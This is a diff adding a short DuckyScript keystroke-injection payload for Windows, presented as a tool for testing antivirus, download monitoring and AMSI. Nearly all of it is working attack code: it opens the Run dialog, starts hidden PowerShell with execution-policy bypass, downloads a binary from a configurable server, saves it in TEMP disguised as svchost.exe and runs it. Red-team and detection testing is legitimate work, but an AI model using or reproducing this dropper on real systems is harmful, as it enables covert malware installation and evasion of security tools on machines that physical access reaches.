@@ -1,0 +1,19 @@
+REM ============================================================
+REM  Windows · Download and Execute Payload
+REM ============================================================
+REM  Downloads a file from your server and executes it. The
+REM  classic dropper technique. Set PAYLOAD_URL to your hosted
+REM  binary or script.
+REM
+REM  Tests: AV file scanning, download monitoring, AMSI.
+
+DEFAULTDELAY 60
+
+DEFINE PAYLOAD_URL http://192.168.1.100:8080/payload.exe
+
+GUI r
+DELAY 700
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1500
+STRINGLN $wc=New-Object Net.WebClient;$f="$env:TEMP\svchost.exe";$wc.DownloadFile('PAYLOAD_URL',$f);Start-Process $f;exit
